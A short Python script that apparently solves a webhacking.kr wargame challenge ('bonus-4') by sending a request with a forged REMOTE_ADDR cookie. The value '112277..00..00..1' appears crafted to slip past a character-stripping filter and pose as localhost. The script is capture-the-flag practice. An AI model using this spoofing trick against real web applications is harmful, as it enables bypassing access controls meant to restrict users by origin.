import requests

url = 'http://webhacking.kr/challenge/bonus/bonus-4'
cookies = {
	'PHPSESSID': '',
	'REMOTE_ADDR': '112277..00..00..1'
}

res = requests.get(url, cookies=cookies)
print(res.text)